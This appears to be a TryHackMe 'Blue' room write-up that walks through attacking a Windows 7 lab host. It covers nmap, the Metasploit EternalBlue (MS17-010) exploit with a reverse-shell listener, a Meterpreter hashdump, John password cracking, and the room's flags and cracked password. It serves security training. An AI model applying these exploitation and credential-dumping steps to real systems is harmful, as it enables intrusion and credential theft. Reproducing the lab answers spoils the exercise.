# TryHackMe - Blue Room Write-Up

**Category:** Easy
**Platform:** Windows
**Skills:** SMB Enumeration, Exploitation (MS17-010), Privilege Escalation

---

## Objective

Exploit the EternalBlue vulnerability on a Windows 7 machine, gain remote access, escalate privileges, and capture flags.

---

## 1. Enumeration 🔎

### Nmap Scan

```bash
nmap -sC -sV -T4 -oN scan.txt <IP>
```

### Key Findings:

* Port 445 (SMB) open
* Windows 7 Professional SP1
* Likely vulnerable to **MS17-010 (EternalBlue)**

---

## 2. Exploitation 🎯

### Metasploit

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-ip>
set LPORT 4444
exploit
```

🎉 If successful, we get a shell!

---

## 3. Upgrade to Meterpreter 💼

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION <id>
run
```

Check current user:

```bash
getuid
```

If already SYSTEM, no need for further escalation.

---

## 4. Dumping Hashes 🔑

```bash
hashdump
```

Sample:

```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Crack with John:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password cracked: `alqfna22`

---

## 5. Flag Collection 🚩

### Flag 1 – Root directory

```bash
C:\flag1.txt
```

📍 `flag{access_the_root}`

### Flag 2 – SAM Backup (optional)

File sometimes auto-deletes. Retry VM if missing.
📍 `flag{passwords_were_here}` (if exists)

### Flag 3 – Jon's Documents

```bash
C:\Users\Jon\Documents\flag3.txt
```

📍 `flag{admin_documents_can_be_valuable}`

---

## Summary 🧩

| Step                 | Status |
| -------------------- | ------ |
| SMB Enumeration      | ✅      |
| EternalBlue Exploit  | ✅      |
| Privilege Escalation | ✅      |
| Hashdump & Cracking  | ✅      |
| Flag Collection      | ✅      |

---

## Lessons Learned 💡

* SMB enumeration is crucial on Windows machines
* EternalBlue remains a dangerous legacy vulnerability
* Privilege escalation and hash cracking strengthen post-exploitation
* File structure knowledge helps find hidden flags

---

📘 *Thanks to TryHackMe for the amazing learning platform!*

---
